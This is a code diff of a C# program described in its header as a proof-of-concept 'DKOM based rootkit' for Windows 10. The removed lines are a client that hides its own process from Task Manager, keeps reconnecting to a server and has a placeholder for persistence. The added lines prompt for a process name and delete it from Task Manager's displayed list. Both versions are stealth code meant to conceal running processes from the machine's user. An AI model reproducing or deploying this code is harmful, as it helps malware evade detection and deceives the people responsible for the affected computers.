@@ -1,88 +1,44 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
-using System.Threading;
 using Client.API;
+
+/// 11-09-2016
+/// oliver.buckler@gmail.com
+/// Tested against Windows 10 (x64)
+
+/// Summary:
+/// This application is a proof of concept for a
+/// DKOM based 'rootkit'; which can interupt the flow
+/// of the Window's "Task Manager".
+/// 
+/// This application's purpose is to see if the 
+/// old process chain manipulation approach was still viable
+/// since its only last writeup using Windows XP (x32).
 
 namespace Client
 {
     class Program
     {
-        private static  LocalMachine _ThisPC = new LocalMachine();
-        private static  Server       _Server = new Server();
-        private static Thread _ThreadHandler;
-
-        // Contents of this function should only be run once at the beginning.
-        private static void Init()
-        {
-            Logger.IsEnabled = true;
-            Console.WriteLine("[{0}] Logging\n", Logger.IsEnabled ? "ON" : "OFF");
-
-
-            //TODO: Insert _Persistence checks here.
-
-            CheckMachineStates();
-
-            // Hide this process from the task manager.
-            _ThreadHandler = new Thread(ManageThreads);
-            _ThreadHandler.Start();
-          
-        }
-
         static void Main(string[] args)
         {
-            Init();
-            do
+            // Grab the address of the window and create a new structure for handling the task manager.
+            IntPtr instance = User32.FindWindow(null, "Task Manager");
+            sTaskMgr taskManagerInstance = new sTaskMgr(instance);
+
+            while (taskManagerInstance.lhWndParent != IntPtr.Zero)
             {
-                // If we are offline.
-                while (_ThisPC.Status == LocalMachine.State.OFFLINE)
-                {
-                    _ThisPC.Reconnect();
-                }
+                // Take the desired process.
+                Console.Write("Process to hide: ");
+                string procName = Console.In.ReadLine();
 
-                // If we are online, but the server is unreachable.
-                while (_Server.Status == Server.State.OFFLINE && _ThisPC.Status == LocalMachine.State.ONLINE)
-                {
-                    _Server.Probe();
-                }
+                // Find the process index from the global process chain
+                int procIndex = taskManagerInstance.GetProcessIndex(procName);
 
-                while (_ThisPC.Status == LocalMachine.State.ONLINE && _Server.Status == Server.State.ONLINE)
-                {
-                    //CheckMachineStates();
-                    //Start();
-                }
-
-                
-                Thread.Sleep(1000);
-            } while (true);
-        }
-
-        // Check if we are online, then if the server is reachable.
-        private static void CheckMachineStates()
-        {
-            _ThisPC.Reconnect();
-            _Server.Probe();
-        }
-
-        private static void ManageThreads()
-        {
-            Thread processScanThread;   
-            while (ThreadedAPI.IsRunning)
-            {
-                processScanThread = new Thread(ThreadedAPI.TProcs.HideProccess);
-
-                if (!processScanThread.IsAlive)
-                {
-                    Console.WriteLine("Thread died, rebooting her up!");
-
-                    processScanThread.Start(Process.GetCurrentProcess().ProcessName);
-                }
-
-                Thread.Sleep(1);
+                // Disable the task managers invalidate method, delete the process 
+                // from memory and re-establish the invalidation.
+                taskManagerInstance.DisableTaskListOnPaint(true);
+                taskManagerInstance.DeleteProcess(procIndex);
+                taskManagerInstance.DisableTaskListOnPaint(false);
             }
         }
-
-
     }
 }
